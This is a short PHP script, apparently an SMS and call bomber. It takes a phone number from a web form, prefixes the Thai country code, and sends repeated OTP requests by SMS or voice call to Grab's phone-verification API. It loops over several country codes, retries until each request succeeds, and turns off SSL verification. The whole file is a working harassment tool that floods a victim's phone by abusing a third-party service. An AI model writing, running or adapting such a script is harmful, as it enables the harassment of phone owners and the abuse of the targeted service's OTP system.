<?php
$argv[1] = substr($_POST["number"], 1);
$argv[1] = "66".$argv[1];
if ($_POST["type"]){
  if ($_POST["type"] == "SMS"){
	$argv[2] = "SMS";
}else if ($_POST["type"] == "CALL"){
	$argv[2] = "CALL";
}else if ($_POST["type"] == "ALL"){
	$argv[2] = "ALL";
}
}else{
	$argv[2] = "CALL";
}
if (!isset($argv[1]) || (isset($argv[2]) && !in_array(strtoupper($argv[2]), ["SMS", "CALL", "ALL"]))) {
	echo "0";
	exit;
} elseif (!isset($argv[2])) {
	$argv[2] = "SMS";
}
$countries = ["MY", "SG", "ID", "TH", "VN", "KH", "PH", "MM"];
shuffle($countries);
$i = 0;
foreach ($countries as $countryCode) {
		$success = false;
		while (!$success) {
			foreach (["SMS", "CALL"] as $method) {
				if (strtoupper($argv[2]) === "ALL" || strtoupper($argv[2]) === $method) {
					$result = @file_get_contents("https://api.grab.com/grabid/v1/phone/otp", false, stream_context_create([
						"http" => [
							"method" => "POST",
							"header" => "Content-type: application/x-www-form-urlencoded",
							"content" => "method=".$method."&countryCode=".$countryCode."&phoneNumber=".$argv[1]."&templateID=&numDigits=4"
						],
						"ssl" => [
							"verify_peer" => false,
							"verify_peer_name" => false
						]
					]));
					if ($result) {
						echo "1";
						$success = true;
					}
				}
			}
		}
	}

?>